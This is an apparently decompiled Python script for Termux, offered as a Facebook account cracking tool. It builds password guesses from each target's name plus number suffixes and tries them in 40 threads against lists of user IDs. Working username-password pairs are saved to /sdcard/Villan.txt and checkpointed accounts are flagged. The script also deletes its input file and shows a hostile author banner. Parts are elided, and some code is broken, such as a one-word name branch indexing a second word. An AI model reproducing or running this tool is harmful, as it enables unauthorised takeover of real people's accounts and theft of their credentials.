# Decompile by : 'SHAHID BASHIR 
import os,sys
try: import requests
except ModuleNotFoundError:print("SHAHID Install Module requests");os.system("python -m pip install requests &> /dev/SHAHID")
try: import bs4
except ModuleNotFoundError:print("SHAHID Install Module bs4");os.system("python -m pip install bs4 &> /dev/SHAHID")
try: import mechanize
except ModuleNotFoundError:print("SHAHID Install Module mechanize");os.system("python -m pip install mechanize &> /dev/SHAHID")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/SHAHID")
## import in
...
def main_apv():
    ...
    logo()
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.SHAHID-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("[*]--------------------------------------------------------------")
        ...
        print ("[*]--------------------------------------------------------------")
        kok=open('/data/data/com.termux/files/usr/bin/.SHAHID-cov', 'w')
        kok.close()
        print ("")
        print ("")
...
class __crack__:
	...
	def plerr(self):
		try:
			self.apk = input(" \033[1;96m[*] PUT THERE YOUR FILE : ")
			print (' \033[1;96m[*]--------------------------------------------------------------')
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m[ SHAHID] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[SHAHID-SUCCESSFUL] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/Villan.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					pass
				print('\r\033[1;91m[SHAHID-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
		...
		loop += 1
	def __pler__(self):
		print ("\033[1;94m [1] Auto  Pass ([ P R O ] ")
			...
			with ThreadPoolExecutor(max_workers=40) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						...
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"12"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123l"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"1234"]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1], xz[0]+"12345"]
						else:
							pwx = [name, xz[0]+xz[1], xz[0]+"month+day+year"]
						_ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
					except:
						pass
			os.remove(self.apk)
...
MR SHAHID BASHIR IS HERE  JUST FUCK YOUR SYSTEM
                                                     
\x1b[1;97m------------------------\x1b[1;97m------------------------×
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97mSHAHID-BASHIR
\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97mhttps://www.facebook.com/03081008587sahil
\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97mUnknow
\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m5.0.1
\x1b[1;97m------------------------\x1b[1;97m------------------------×
                                                 """
ct = datetime.now()
n = ct.month
